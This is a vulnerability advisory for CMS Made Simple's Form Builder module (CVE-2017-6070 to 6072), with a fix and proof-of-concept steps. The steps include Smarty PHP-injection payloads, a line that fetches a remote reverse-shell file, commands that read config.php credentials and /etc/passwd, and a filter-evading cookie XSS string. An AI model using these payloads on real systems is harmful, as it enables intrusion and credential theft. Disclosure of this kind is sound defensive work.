=== Content from daylight-it.com_3cd7b9ff_20250124_162150.html ===

**Daylight Cyber Security & Consultancy**[![Logo](a/daylight-logo.png "Daylight Cyber Security & Consultancy")](https://daylight-it.com/ "Daylight Cyber Security & IT Consultancy")
# Security Advisory

Title: **CMS Made Simple Form Builder authorization bypass vulnerability**
Class: Bypassing Authorization
CVE: [CVE-2017-6070](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6070 "CVE Details") [CVE-2017-6071](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6071 "CVE Details") [CVE-2017-6072](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6072 "CVE Details")
Remote: Yes
Local: No
Published: Feb 17 2017 02:00 PM
Updated: Feb 18 2017 11:00 AM
Credit: Peter Arts ([[email protected]](/cdn-cgi/l/email-protection))
Vulnerable: CMS Made Simple Form Builder 0.6.4 (only 2 & 3)
CMS Made Simple Form Builder 0.7 (only 2 & 3)
CMS Made Simple Form Builder 0.7.1 (only 2 & 3)
CMS Made Simple Form Builder 0.7.2 (only 2 & 3)
CMS Made Simple 1.x Form Builder 0.7.3
CMS Made Simple 1.x Form Builder 0.7.4
CMS Made Simple 1.x Form Builder 0.8
CMS Made Simple 1.x Form Builder 0.8.1.1
CMS Made Simple 1.x Form Builder 0.8.1.2
CMS Made Simple 1.x Form Builder 0.8.1.3
CMS Made Simple 1.x Form Builder 0.8.1.4
**About the module:**
This is the next generation of Feedback Forms, which will include an API for modules to use, as well as a general structured data system. CMSMS 1.12.x and 2.x compatible.
Latest Release: 0.8.1.6, 2017-02-17
Project link: <http://dev.cmsmadesimple.org/projects/formbuilder>
**Information:**
The CMS Made Simple Form Builder module is prone to multiple vulnerabilities that lets remote attackers execute arbitrary code and perform stored XSS attacks because the module fails to check permissions in several admin pages. An attacker may leverage this issue to execute arbitrary PHP code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access and can be exploited by malicious people to compromise a vulnerable system.
These problems exists in both CMS Made Simple version 1 and 2, but code execution seems to be possible in version 1 only (and depending on Smarty configuration).
**Affected versions:**
0.7.3 through 0.8.1.5
0.6.4 through 0.8.1.5 (vulnerability 2 & 3)
**[CVE-2017-6070](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6070 "CVE Details"): Vulnerability 1 (POC):**
CMS Made Simple version 1.x Form Builder before version 0.8.1.6 allows remote attackers to execute PHP code via the cntnt01fbrp\_forma\_form\_template parameter in admin\_store\_form.
Attackers may exploit this issue through a browser. Steps:
1. Open URL:
**http://host/index.php?mact=FormBuilder,cntnt01,admin\_store\_form,0&cntnt01showtemplate=false&cntnt01form\_id=[FORM\_ID]**
Grab form\_id from hidden input field “cntnt01form\_id” in HTML-source of a published webform on target website or enumerate starting 1.
2. Replace contents of the “Template to use to Display Form” (“cntnt01fbrp\_forma\_form\_template”) input field with PHP code wrapped in Smarty PHP tags:
**{php}
phpinfo();
{/php}**
Limitations: cannot use ', ", $, <, >, and several other special characters as these are being escaped or removed by CMS Made Simple input sanitizer. Therefore, for example PHP string open/close characters (â/”) cannot be used and one is limited to a subset of characters to prevent PHP parser errors.
This can be circumvented by downloading remote PHP source file using “include()” or “file\_get\_contents()” and saving the contents to a permanent location:
**echo file\_put\_contents(reverseshell.chr(46).php, file\_get\_contents([DOWNLOAD\_URL]));**
If allow\_url\_fopen is disabled, curl can be used instead.
If PHP tags are disabled in Smarty configuration, “eval” can be used instead (see next section).
3. Invoke PHP code by requesting the website page the form has been published on or via:
**http://host/index.php?mact=FormBuilder,cntnt01,default,0&cntnt01showtemplate=false&cntnt01form\_id=[FORM\_ID]**
Print CMS Made Simple configuration file, containing database login credentials, output is on the published page:
**{php} echo file\_get\_contents(config.chr(46).php); {/php}**
Print /etc/passwd:
**{php} echo file\_get\_contents(DIRECTORY\_SEPARATOR.etc.DIRECTORY\_SEPARATOR.passwd); {/php}**
Stored XSS example using “eval”:
**{eval chr(60)}SCRIPT{eval chr(62)}alert(document.cookie){eval chr(60)}{eval chr(47)}SCRIPT{eval chr(62)}**
**[CVE-2017-6071](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6071 "CVE Details"): Vulnerability 2 (POC):**
CMS Made Simple version 1.x Form Builder before version 0.8.1.6 allows remote attackers to conduct information-disclosure attacks via exportxml.
Attackers may exploit this issue through a browser.
**http://host/index.php?mact=FormBuilder,cntnt01,exportxml,0&cntnt01showtemplate=false&cntnt01form\_id=[FORM\_ID]**
Grab form\_id from hidden input field âcntnt01form\_idâ in HTML source of a published webform on target website or enumerate starting 1.
Form properties can disclose email addresses.
**[CVE-2017-6072](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6072 "CVE Details"): Vulnerability 3 (POC):**
CMS Made Simple version 1.x Form Builder before version 0.8.1.6 allows remote attackers to conduct information-disclosure attacks via defaultadmin.
Attackers may exploit this issue through a browser.
**http://host/index.php?mact=FormBuilder,cntnt01,defaultadmin,0&cntnt01showtemplate=false**
Website forms are being disclosed and XML upload form is visible (contents not being processed).
**Solution:**
Add the following line of code to the affected PHP files (action.admin\_store\_form.php, action.defaultadmin.php, action.exportxml.php):
**if (! $this->CheckAccess()) exit;**
Please update to version 0.8.1.6. as soon as possible (fixed version).

© 2017-2019 [Daylight IT](https://daylight-it.com/ "Daylight Cyber Security & IT Consultancy") - All rights reserved - [Responsible disclosure](responsible-disclosure.html "Responsible disclosure")


